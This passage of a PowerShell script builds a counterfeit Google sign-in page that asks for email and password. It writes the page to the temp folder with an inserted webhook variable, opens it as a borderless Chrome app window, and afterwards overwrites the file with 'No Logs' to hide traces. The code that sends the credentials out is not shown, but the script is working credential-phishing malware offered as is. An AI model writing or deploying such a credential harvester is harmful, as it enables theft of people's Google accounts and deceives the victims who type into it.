    border-radius: 0.312rem;
    font-size: 1rem;
    float: right;
    }
  .box button[type="submit"]:hover {
    background-color: #287ae6;
    box-shadow: 0 1px 1px 0 rgba(66,133,244,0.45), 0 1px 3px 1px rgba(66,133,244,0.3);}
a.left-link {
  float: left;
  text-decoration: none;
  font-size: 14px; 
  margin-top: 10px; 
  }
</style>
</head>
<body>
<div class="box">
    <img src='https://i.ibb.co/Sm67Hrs/googs.png' alt='Google'>
        <div class="logo">
        </div>
    <h2>Sign in</h2>
    <p>Use your Google Account</p>
    <form>
        <div class="inputBox">
          <input type="email" id="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
          <label>Email</label>
        </div>
        <div class="inputBox">
              <input type="password" id="message" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
              <label>Password</label>
            </div>
        <a href="https://accounts.google.com/signup/v2/createaccount" class="left-link">Create account</a>
        <button onclick="sendEmail(),event.preventDefault();" type="submit">Sign In</button>
      </form>
    </div>
</body>
</html>
"@


$htmlFile = "$env:temp\google.html"
$htmlcode1 | Out-File $htmlFile -Force
$webhk | Out-File $htmlFile -Append -Force
$htmlcode2 | Out-File $htmlFile -Append -Force


$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$screenWidth = $screen.WorkingArea.Width
$screenHeight = $screen.WorkingArea.Height
$left = ($screenWidth - $width) / 2
$top = ($screenHeight - $height) / 2
$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$width = 530
$height = 600

$arguments = "--new-window --window-position=$left,$top --window-size=$width,$height --app=$htmlFile"
$chromeProcess = Start-Process -FilePath $chromePath -ArgumentList $arguments -PassThru
$chromeProcess.WaitForExit()

sleep 2
$outword = "No Logs"
$outword | Out-File $htmlFile -Force
sleep 1
